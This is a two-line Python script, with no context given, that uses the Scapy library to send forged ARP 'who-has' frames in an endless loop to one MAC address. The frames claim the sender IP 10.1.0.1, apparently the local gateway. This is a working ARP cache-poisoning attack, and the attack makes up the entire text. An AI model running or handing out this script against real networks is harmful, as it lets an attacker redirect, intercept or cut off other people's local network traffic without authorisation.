from scapy.all import *

sendp(Ether(dst='86:85:9d:13:f9:61')/ARP(op='who-has', psrc='10.1.0.1', pdst='10.1.0.2'),
inter=0.2, loop=1)
